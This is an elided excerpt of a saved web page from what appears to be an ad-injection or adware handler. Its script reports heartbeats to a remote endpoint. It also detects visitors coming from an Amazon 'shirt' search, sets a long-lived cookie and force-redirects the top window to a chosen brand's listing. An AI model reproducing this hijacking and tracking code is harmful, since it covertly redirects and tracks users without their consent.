...
<!-- saved from url=(0291)https://foxi69.tlscdn.com/altHbHandler.html#opdom=pudijs.info&partner=pudi&channel=pudi&country=IN&quick=https%3A%2F%2Fendall41-q.apollocdn.com%2F&trinity=Z13h6k362r4t&instgrp=&referrer=http%3A%2F%2Fglobal.diesel.com%2Fhomepage%3Forigin%3DNOUS&hid=F0B1E355-4391-47E2-9423-C4B8AB021642&sset=8 -->
	...
	<body>
		<script type="text/javascript">
	        ...
	        var reportHeartbit = function(){
				...
				var url = getQuickBaseUrl() + 'event-report.php';
			...
			(function(){
				...
				try{
					var cond1 = document.referrer.indexOf("amazon.com") !== -1;
					var cond2 = document.referrer.match(/.*field-keywords=.*shirt.*/) !== null;
					var cname = "shirt";
					var cond3 = getCookie(cname) === "";

					if(cond1 && cond2 && cond3){
						setCookie(cname, "dsafdsfsd"  , 365*5);
						window.top.location.href = "http://www.amazon.com/s/ref=sr_il_ti_fashion?rh=n%3A7141123011%2Cp_4%3ATiny+Flair&ie=UTF8&qid=1447763709&lo=fashion"; 
					}
